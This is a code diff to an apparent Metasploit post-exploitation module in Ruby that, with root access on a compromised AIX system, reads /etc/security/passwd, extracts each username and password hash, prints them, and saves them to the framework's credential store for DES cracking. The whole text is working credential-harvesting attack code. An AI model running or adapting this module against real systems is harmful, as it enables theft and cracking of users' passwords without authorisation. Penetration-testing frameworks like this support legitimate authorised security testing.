@@ -27,32 +27,43 @@ class Metasploit3 < Msf::Post
   def run
     if is_root?
       passwd_file = read_file("/etc/security/passwd")
-      jtr = parse_aix_passwd(passwd_file)
-      p = store_loot("aix.hashes", "text/plain", session, jtr, "aix_passwd.txt", "AIX Password File")
-      vprint_status("Passwd saved in: #{p.to_s}")
+
+      username = ''
+      hash     = ''
+
+      passwd_file.each_line do |line|
+        user_line = line.match(/(\w+):/)
+        if user_line
+          username = user_line[1]
+        end
+
+        hash_line = line.match(/password = (\w+)/)
+        if hash_line
+          hash = hash_line[1]
+        end
+
+        if hash.present?
+          print_good "#{username}:#{hash}"
+          credential_data = {
+              jtr_format: 'des',
+              origin_type: :session,
+              post_reference_name: self.refname,
+              private_type: :nonreplayable_hash,
+              private_data: hash,
+              session_id: session_db_id,
+              username: username,
+              workspace_id: myworkspace_id
+          }
+          create_credential(credential_data)
+          username = ''
+          hash     = ''
+        end
+      end
+
     else
       print_error("You must run this module as root!")
     end
 
   end
-
-
-  def parse_aix_passwd(aix_file)
-    jtr_file = ""
-    tmp = ""
-    aix_file.each_line do |line|
-      username = line.match(/(\w+:)/)
-      if username
-        tmp = username[0]
-      end
-      hash = line.match(/password = (\w+)/)
-      if hash
-        tmp << hash[1]
-        jtr_file << "#{tmp}\n"
-      end
-    end
-    return jtr_file
-  end
-
 
 end
